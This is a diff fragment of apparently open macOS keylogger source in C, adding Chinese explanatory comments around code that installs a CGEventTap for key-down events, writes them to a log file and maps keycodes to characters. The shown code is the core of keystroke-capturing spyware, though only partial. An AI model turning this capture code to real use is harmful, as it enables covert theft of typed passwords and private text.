@@ -1,7 +1,7 @@
 #include "keylogger.h"
 
 int main(int argc, const char *argv[]) {
-
+    // 只是调用的函数不太一样
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
     CFMachPortRef eventTap = CGEventTapCreate(
         kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
@@ -40,7 +40,7 @@ int main(int argc, const char *argv[]) {
 
     printf("Logging to: %s\n", logfileLocation);
     fflush(stdout);
-    CFRunLoopRun();
+    CFRunLoopRun();  // 循环
 
     return 0;
 }
@@ -56,7 +56,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     return event;
 }
-
+// mac下的用switch case 去获取 键盘的所有值
 const char *convertKeyCode(int keyCode) {
     switch ((int) keyCode) {
         case 0:   return "a";
